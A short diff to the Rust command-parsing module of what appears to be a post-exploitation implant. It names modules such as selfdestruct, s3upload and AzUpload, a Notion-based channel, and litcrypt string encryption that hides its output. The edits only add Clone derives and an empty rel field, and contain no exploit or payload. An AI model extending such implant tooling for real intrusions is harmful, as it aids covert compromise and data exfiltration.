@@ -31,8 +31,7 @@ mod s3upload;
 mod selfdestruct;
 mod sysinfo;
 mod ls;
-
-/// Uses litcrypt to encrypt output strings
+/// Uses litcrypt    to encrypt output strings
 /// and create `Ok(String)` output
 macro_rules! command_out {
     ($s:tt) => {{
@@ -51,6 +50,7 @@ macro_rules! command_out {
 pub(crate) use command_out;
 
 /// All the possible command types. Some have command strings, and some don't.
+#[derive(Debug, Clone)]
 pub enum CommandType {
     AzUpload,
     Cd,
@@ -94,7 +94,7 @@ impl fmt::Display for CommandError {
 /// 
 /// As an `Iterator`, `CommandArgs` and be unwrapped with default
 /// values as a safety for missing or malformed args.
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 pub struct CommandArgs {
     items: Vec<String>,
     count: usize
@@ -164,6 +164,7 @@ impl Iterator for CommandArgs {
 /// The `rel` attribute is used to contain any reference back to parent objects
 /// that might be necessary. For example, [NotionChannel] will use this to store block ids.
 ///  
+#[derive(Debug, Clone)]
 pub struct AgentCommand {
     pub command_type: CommandType,
     pub args: CommandArgs,
@@ -207,7 +208,7 @@ impl AgentCommand {
                 "whoami"       => CommandType::Whoami,
                 _              => CommandType::Unknown,
             };
-            return Ok(AgentCommand { command_type: command_type, args: command_args});
+            return Ok(AgentCommand { command_type: command_type, args: command_args, rel: "".to_string()});
 
         } else {
             Err(CommandError("Could not parse command!".to_string()))
